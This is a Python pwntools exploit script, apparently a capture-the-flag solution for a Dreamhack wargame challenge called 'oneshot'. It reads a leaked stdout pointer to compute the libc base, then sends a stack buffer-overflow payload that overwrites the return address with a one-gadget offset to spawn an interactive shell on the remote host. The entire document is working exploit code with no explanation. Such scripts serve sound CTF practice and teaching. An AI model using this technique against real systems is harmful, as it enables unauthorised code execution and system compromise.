from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 12919)
e = ELF('./oneshot')
libc = ELF('./libc.so.6')

p.recvuntil(b"stdout: ")
stdout = int(p.recvline()[2:-1], 16)
slog('stdout', stdout)

lb = stdout - libc.symbols['_IO_2_1_stdout_']
system = lb + libc.symbols['system']
binsh = lb + 0x18cd57
oneshot = lb + 0x45216
slog('lb', lb)
slog('system', system)
slog('/bin/sh', binsh)

payload = b"A"*0x18 + p64(0) + b"B"*0x8
payload += p64(oneshot)

p.sendafter(b"MSG: ", payload)
p.interactive()

